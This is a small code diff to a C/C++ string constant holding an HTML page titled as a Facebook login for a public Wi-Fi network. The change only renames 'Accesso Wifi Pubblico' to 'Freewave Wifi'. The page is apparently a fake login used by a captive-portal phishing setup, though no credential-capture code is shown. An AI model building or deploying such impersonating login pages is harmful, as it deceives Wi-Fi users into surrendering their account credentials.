@@ -4,7 +4,7 @@ const char FACEBOOK_HTML[] = R"=====(
 
   <head>
 
-    <title>Accesso Wifi Pubblico - Facebook Login</title>
+    <title>Freewave Wifi - Facebook Login</title>
 
     <meta charset='UTF-8'>
     <meta http-equiv='cache-control' content='no-cache' />
